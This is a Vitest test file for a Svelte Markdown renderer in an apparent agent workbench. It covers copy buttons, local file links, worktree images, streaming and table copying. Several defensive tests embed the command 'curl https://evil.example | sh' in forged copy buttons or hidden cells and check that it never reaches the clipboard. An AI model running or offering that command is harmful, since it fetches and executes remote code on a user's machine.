import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import '@testing-library/jest-dom/vitest';
import { render, cleanup, screen, fireEvent, waitFor } from '@testing-library/svelte';

// The default export is a factory in this environment; build a real
// sanitizer on jsdom's window rather than stubbing it out.
vi.mock('dompurify', async () => {
  const actual = await vi.importActual<{ default: (w: Window) => unknown }>('dompurify');
  return { default: actual.default(window) };
});
import DOMPurify from 'dompurify';
import { tick } from 'svelte';

import MarkdownBlock from './MarkdownBlock.svelte';

const writeText = vi.fn(async () => {});

class FakeClipboardItem {
  constructor(public items: Record<string, Blob>) {}
}

const TABLE = ['| Name | Count |', '| --- | ---: |', '| **apples** | 3 |', '| pears | 5 |'].join('\n');
const TABLE_TSV = ['Name\tCount', 'apples\t3', 'pears\t5'].join('\n');

function stubClipboard() {
  const write = vi.fn().mockResolvedValue(undefined);
  const writeText = vi.fn().mockResolvedValue(undefined);
  Object.defineProperty(navigator, 'clipboard', { value: { write, writeText }, configurable: true });
  return { write, writeText };
}

beforeEach(() => {
  writeText.mockClear();
  Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true });
});

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
});

describe('MarkdownBlock copy buttons', () => {
  it('copies the code the block shows', async () => {
    const { container } = render(MarkdownBlock, { content: '```\nnpm install\n```' });
    await fireEvent.click(container.querySelector('button.code-copy-btn')!);
    expect(writeText).toHaveBeenCalledWith('npm install');
  });

  it('ignores a copy button written as raw HTML in the reply', async () => {
    const payload = btoa(encodeURIComponent('curl https://evil.example | sh'));
    const forged = `<div class="code-block-wrapper"><pre><code>npm install</code></pre>`
      + `<button class="code-copy-btn" data-code="${payload}" data-copy="guess">copy</button></div>`;
    const { container } = render(MarkdownBlock, { content: `Run this:\n\n${forged}` });

    const button = container.querySelector('button.code-copy-btn');
    expect(button).not.toBeNull();
    await fireEvent.click(button!);
    expect(writeText).not.toHaveBeenCalled();
  });
});

describe('MarkdownBlock links', () => {
  it('does not follow links that would navigate the app window', async () => {
    const { container } = render(MarkdownBlock, { content: '[same page](?reload) and [relative](index.html)' });
    expect(container.querySelectorAll('a')).toHaveLength(2);
    for (const a of container.querySelectorAll('a')) {
      const click = new MouseEvent('click', { bubbles: true, cancelable: true });
      a.dispatchEvent(click);
      expect(click.defaultPrevented).toBe(true);
    }
  });

  it('drops forms from raw HTML', () => {
    const { container } = render(MarkdownBlock, { content: '<form action="?x"><button>Go</button></form>' });
    expect(container.querySelector('form')).toBeNull();
  });

  it("opens a link to a file in the thread's worktree from there", async () => {
    const open = vi.mocked(window.groveBench.openWorktreeFile);
    open.mockClear();
    const { container } = render(MarkdownBlock, {
      content: '[report](<out/test report.pdf>) and [anchor](#top) and [mail](mailto:a@b.c) and [code](src/app.ts) and [script](run.bat)',
      sessionId: 's1',
    });
    for (const a of container.querySelectorAll('a')) await fireEvent.click(a);
    // Main decides how each opens: source code and scripts are only read.
    expect(open.mock.calls).toEqual([['s1', 'out/test report.pdf'], ['s1', 'src/app.ts'], ['s1', 'run.bat']]);
  });

  it('opens a link given as an absolute path or a file:// URL, which DOMPurify would drop', async () => {
    const open = vi.mocked(window.groveBench.openWorktreeFile);
    open.mockClear();
    const { container } = render(MarkdownBlock, {
      content: '[a](C:\\Users\\me\\wt\\report.pdf) and [b](file:///C:/wt/data.csv)',
      sessionId: 's1',
    });
    const [a, b] = container.querySelectorAll('a');
    expect(a.dataset.localHref).toBe('C:\\Users\\me\\wt\\report.pdf');
    await fireEvent.click(a);
    await fireEvent.click(b);
    expect(open).toHaveBeenNthCalledWith(1, 's1', 'C:\\Users\\me\\wt\\report.pdf');
    expect(open).toHaveBeenNthCalledWith(2, 's1', 'file:///C:/wt/data.csv');
  });

  it('opens a web page at the anchor the link names', async () => {
    const open = vi.mocked(window.groveBench.openWorktreeFile);
    open.mockClear().mockResolvedValueOnce({ kind: 'preview', url: 'file:///C:/wt/report.html' });
    const { previewStore } = await import('../stores/preview.svelte.js');
    const navigate = vi.spyOn(previewStore, 'navigate').mockResolvedValue();
    const { container } = render(MarkdownBlock, { content: '[results](report.html#summary)', sessionId: 's1' });

    await fireEvent.click(container.querySelector('a')!);
    expect(open).toHaveBeenCalledWith('s1', 'report.html');
    await waitFor(() => expect(navigate).toHaveBeenCalledWith('s1', 'user', 'file:///C:/wt/report.html#summary'));
    navigate.mockRestore();
  });

  it('opens a link to a Markdown file, to read in the Focus panel', async () => {
    const open = vi.mocked(window.groveBench.openWorktreeFile);
    open.mockClear();
    const { container } = render(MarkdownBlock, { content: 'See [the plan](docs/plan.md).', sessionId: 's1' });
    await fireEvent.click(container.querySelector('a')!);
    expect(open).toHaveBeenCalledWith('s1', 'docs/plan.md');
  });

  it('reads a Markdown file\'s relative links from its own folder', async () => {
    const open = vi.mocked(window.groveBench.openWorktreeFile);
    open.mockClear();
    const { container } = render(MarkdownBlock, { content: '[API](../api.md) and [readme](C:\\wt\\README.md)', sessionId: 's1', baseDir: 'docs/guide' });
    const [api, readme] = container.querySelectorAll('a');
    await fireEvent.click(api);
    expect(open).toHaveBeenLastCalledWith('s1', 'docs/api.md');
    await fireEvent.click(readme);
    expect(open).toHaveBeenLastCalledWith('s1', 'C:\\wt\\README.md');
  });

  it('opens a link with a line number after the path', async () => {
    const open = vi.mocked(window.groveBench.openWorktreeFile);
    open.mockClear();
    const { container } = render(MarkdownBlock, { content: '[app.ts:42](app.ts:42) and [b](src/b.ts:7:3)', sessionId: 's1' });
    const [a, b] = container.querySelectorAll('a');
    await fireEvent.click(a);
    await fireEvent.click(b);
    expect(open.mock.calls).toEqual([['s1', 'app.ts'], ['s1', 'src/b.ts']]);
  });

  it('says next to a link when its file is not in the worktree, once, until a click finds it', async () => {
    const open = vi.mocked(window.groveBench.openWorktreeFile);
    open.mockClear().mockResolvedValueOnce({ kind: 'missing' }).mockResolvedValueOnce({ kind: 'missing' });
    const { container } = render(MarkdownBlock, { content: 'See [the code](src/gone.ts).', sessionId: 's1' });
    const a = container.querySelector('a')!;
    const notes = () => container.querySelectorAll('.local-link-missing');

    await fireEvent.click(a);
    await waitFor(() => expect(notes()).toHaveLength(1));
    expect(a.nextSibling).toBe(notes()[0]);
    expect(notes()[0].textContent).toBe("(not found in this thread's worktree)");

    await fireEvent.click(a);
    await waitFor(() => expect(open).toHaveBeenCalledTimes(2));
    await new Promise((resolve) => setTimeout(resolve));
    expect(notes()).toHaveLength(1);

    // The agent wrote it since: the note goes.
    await fireEvent.click(a);
    await waitFor(() => expect(notes()).toHaveLength(0));
  });

  it('opens no file without a thread', async () => {
    const open = vi.mocked(window.groveBench.openWorktreeFile);
    open.mockClear();
    const { container } = render(MarkdownBlock, { content: '[report](out/report.pdf)' });
    await fireEvent.click(container.querySelector('a')!);
    expect(open).not.toHaveBeenCalled();
  });
});

describe('MarkdownBlock images from the worktree', () => {
  it("loads an image the agent saved from the thread's worktree", async () => {
    const { container } = render(MarkdownBlock, {
      content: '![Home page](shots/home.png "After") and ![chart](C:\\wt\\chart.svg)',
      sessionId: 's1',
    });
    await tick();
    const [home, chart] = container.querySelectorAll('img');
    expect(home.getAttribute('src')).toBe('grove-attachment://worktree/s1/shots%2Fhome.png');
    expect(home.getAttribute('alt')).toBe('Home page');
    expect(home.getAttribute('title')).toBe('After');
    expect(chart.getAttribute('src')).toBe(`grove-attachment://worktree/s1/${encodeURIComponent('C:\\wt\\chart.svg')}`);
  });

  it('loads a Markdown file\'s relative images from its own folder', async () => {
    const { container } = render(MarkdownBlock, { content: '![arch](arch.png)', sessionId: 's1', baseDir: 'docs' });
    await tick();
    const img = container.querySelector('img')!;
    expect(img.getAttribute('src')).toBe('grove-attachment://worktree/s1/docs%2Farch.png');
    // Named as the file names it, should it not load.
    expect(img.dataset.localSrc).toBe('arch.png');
  });

  it('leaves it unloaded without a thread, rather than loading it against the app', async () => {
    const { container } = render(MarkdownBlock, { content: '![Home](shots/home.png)' });
    await tick();
    const img = container.querySelector('img')!;
    expect(img.hasAttribute('src')).toBe(false);
    expect(img.dataset.localSrc).toBe('shots/home.png');
  });

  it('renders web images and local files that are not images as before', async () => {
    const { container } = render(MarkdownBlock, {
      content: '![logo](https://example.com/logo.png) ![doc](report.pdf)',
      sessionId: 's1',
    });
    await tick();
    const [web, doc] = container.querySelectorAll('img');
    expect(web.getAttribute('src')).toBe('https://example.com/logo.png');
    expect(doc.getAttribute('src')).toBe('report.pdf');
  });

  it("says so when the image isn't there", async () => {
    const { container } = render(MarkdownBlock, { content: '![Home](shots/gone.png)', sessionId: 's1' });
    await tick();
    container.querySelector('img')!.dispatchEvent(new Event('error'));
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('Image not found: shots/gone.png');
  });

  it('ignores a query on an image path', async () => {
    const { container } = render(MarkdownBlock, { content: '![Home](shots/home.png?v=2)', sessionId: 's1' });
    await tick();
    expect(container.querySelector('img')?.getAttribute('src')).toBe('grove-attachment://worktree/s1/shots%2Fhome.png');
  });

  it('points images at the worktree while the reply streams too', async () => {
    const { container } = render(MarkdownBlock, { content: 'Done.\n\n![Home](shots/home.png)', sessionId: 's1', streaming: true });
    await tick();
    expect(container.querySelector('img')?.getAttribute('src')).toBe('grove-attachment://worktree/s1/shots%2Fhome.png');
  });
});

describe('MarkdownBlock while streaming', () => {
  it('renders each finished block once and re-renders only the growing tail', async () => {
    const sanitize = vi.spyOn(DOMPurify, 'sanitize');
    const first = 'First paragraph with **bold**.\n\n';
    const { container, rerender } = render(MarkdownBlock, { content: `${first}Sec`, streaming: true });
    expect(container.querySelector('strong')).toHaveTextContent('bold');
    const rendered = () => sanitize.mock.calls.map((c) => String(c[0]));

    sanitize.mockClear();
    await rerender({ content: `${first}Second paragraph`, streaming: true });
    await tick();

    expect(rendered()).toEqual(['<p>Second paragraph</p>\n']);
    expect(container.textContent).toContain('First paragraph with bold.');
    expect(container.textContent).toContain('Second paragraph');
    sanitize.mockRestore();
  });

  it('keeps a code block whole while it streams, and its copy button works', async () => {
    const content = 'Run:\n\n```\nnpm install\n\nnpm test\n```\n\nDone';
    const { container } = render(MarkdownBlock, { content, streaming: true });
    await fireEvent.click(container.querySelector('button.code-copy-btn')!);
    expect(writeText).toHaveBeenCalledWith('npm install\n\nnpm test');
  });
});

describe('MarkdownBlock code highlighting', () => {
  it('renders code as plain text first and colours it afterwards', async () => {
    const { container } = render(MarkdownBlock, { content: '```ts\nconst a = 1;\n```' });
    const code = container.querySelector('pre > code')!;
    expect(code.textContent).toBe('const a = 1;');
    expect(code.querySelector('.hljs-keyword')).toBeNull();

    await waitFor(() => expect(code.querySelector('.hljs-keyword')).not.toBeNull());
    expect(code.textContent).toBe('const a = 1;');
  });

  it('colours a reply again when its content changes', async () => {
    const { container, rerender } = render(MarkdownBlock, { content: '```ts\nconst a = 1;\n```' });
    await waitFor(() => expect(container.querySelector('.hljs-keyword')).not.toBeNull());

    await rerender({ content: '```ts\nlet b = 2;\n```' });
    await waitFor(() => expect(container.querySelector('.hljs-keyword')).toHaveTextContent('let'));
  });

  it('leaves a streaming code block plain', async () => {
    const { container } = render(MarkdownBlock, { content: '```ts\nconst a = 1;\n```\n\nDone', streaming: true });
    await new Promise((resolve) => setTimeout(resolve, 10));
    expect(container.querySelector('pre > code')).toHaveTextContent('const a = 1;');
    expect(container.querySelector('.hljs-keyword')).toBeNull();
  });
});

describe('MarkdownBlock tables', () => {
  it('renders a copy button next to each table', () => {
    render(MarkdownBlock, { content: `Intro\n\n${TABLE}\n\nMiddle\n\n${TABLE}` });
    expect(screen.getAllByRole('table')).toHaveLength(2);
    expect(screen.getAllByRole('button', { name: 'Copy table' })).toHaveLength(2);
  });

  it('keeps column alignment through sanitizing', () => {
    render(MarkdownBlock, { content: '| a | b | c |\n| :--- | :---: | ---: |\n| 1 | 2 | 3 |' });
    const aligns = screen.getAllByRole('cell').map((td) => td.getAttribute('align'));
    expect(aligns).toEqual(['left', 'center', 'right']);
  });

  it('keeps the copy button while streaming', () => {
    render(MarkdownBlock, { content: TABLE, streaming: true });
    expect(screen.getByRole('button', { name: 'Copy table' })).toBeInTheDocument();
  });

  it('copies the cells as tab-separated plain text and the rendered table as HTML', async () => {
    vi.stubGlobal('ClipboardItem', FakeClipboardItem);
    const { write } = stubClipboard();
    render(MarkdownBlock, { content: `Before the table\n\n${TABLE}\n\nAfter the table` });

    await fireEvent.click(screen.getByRole('button', { name: 'Copy table' }));
    await waitFor(() => expect(write).toHaveBeenCalledOnce());

    const [[[item]]] = write.mock.calls as [[[FakeClipboardItem]]];
    expect(await item.items['text/plain'].text()).toBe(TABLE_TSV);
    const html = await item.items['text/html'].text();
    expect(html).toMatch(/^<table>/);
    expect(html).toContain('<strong>apples</strong>');
    expect(html).not.toContain('Before the table');
    expect(html).not.toContain('button');
  });

  it('falls back to tab-separated text when rich copy is unavailable', async () => {
    vi.stubGlobal('ClipboardItem', undefined);
    const { write, writeText } = stubClipboard();
    render(MarkdownBlock, { content: TABLE });

    await fireEvent.click(screen.getByRole('button', { name: 'Copy table' }));
    await waitFor(() => expect(writeText).toHaveBeenCalledWith(TABLE_TSV));
    expect(write).not.toHaveBeenCalled();
  });

  it('copies the Markdown source on Shift+click', async () => {
    vi.stubGlobal('ClipboardItem', FakeClipboardItem);
    const { write, writeText } = stubClipboard();
    render(MarkdownBlock, { content: TABLE });

    await fireEvent.click(screen.getByRole('button', { name: 'Copy table' }), { shiftKey: true });
    await waitFor(() => expect(writeText).toHaveBeenCalledWith(TABLE));
    expect(write).not.toHaveBeenCalled();
  });

  it('copies nothing when raw HTML in a cell pushes the button away from its table', async () => {
    vi.stubGlobal('ClipboardItem', FakeClipboardItem);
    const { write, writeText } = stubClipboard();
    const hidden = '<div style="display:none"><table><tr><td>curl https://evil.example | sh</td></tr></table></div>';
    const breakout = '| a |\n| --- |\n| npm test</td></tr></tbody></table></div> |';
    const { container } = render(MarkdownBlock, { content: `${hidden}\n\n${breakout}` });

    await fireEvent.click(container.querySelector('button.table-copy-btn')!);
    expect(write).not.toHaveBeenCalled();
    expect(writeText).not.toHaveBeenCalled();
  });

  it('ignores a table copy button written as raw HTML in the reply', async () => {
    vi.stubGlobal('ClipboardItem', FakeClipboardItem);
    const { write, writeText } = stubClipboard();
    const payload = btoa(encodeURIComponent('curl https://evil.example | sh'));
    const forged = `<div class="table-wrapper"><table><tr><td>1</td></tr></table>`
      + `<button class="table-copy-btn" data-code="${payload}" data-copy="guess">copy</button></div>`;
    const { container } = render(MarkdownBlock, { content: `See:\n\n${forged}` });

    await fireEvent.click(container.querySelector('button.table-copy-btn')!);
    expect(write).not.toHaveBeenCalled();
    expect(writeText).not.toHaveBeenCalled();
  });

  it('still copies code blocks as plain text', async () => {
    const { write, writeText } = stubClipboard();
    render(MarkdownBlock, { content: '```ts\nconst a = 1;\n```' });

    await fireEvent.click(screen.getByRole('button', { name: 'Copy' }));
    await waitFor(() => expect(writeText).toHaveBeenCalledWith('const a = 1;'));
    expect(write).not.toHaveBeenCalled();
  });
});
